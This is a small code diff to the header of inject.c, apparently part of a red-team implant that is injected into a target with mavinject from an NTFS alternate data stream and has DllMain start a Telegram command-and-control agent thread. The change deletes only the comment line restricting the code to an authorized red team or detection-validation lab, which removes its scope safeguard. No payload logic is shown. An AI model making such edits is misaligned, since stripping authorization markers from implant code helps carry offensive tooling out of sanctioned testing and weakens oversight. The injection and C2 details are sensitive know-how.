@@ -1,6 +1,6 @@
 /* inject.c - TVeronica lab: Stage 3 payload (loaded into target via mavinject from NTFS ADS).
-   Authorized red team / detection-validation lab only.
-   DllMain spawns the Telegram C2 agent thread (see c2core.c). */
+   DllMain spawns the Telegram C2 agent thread (see c2core.c). 
+*/
 #define WIN32_LEAN_AND_MEAN
 #include <windows.h>
 #include "c2core.h"
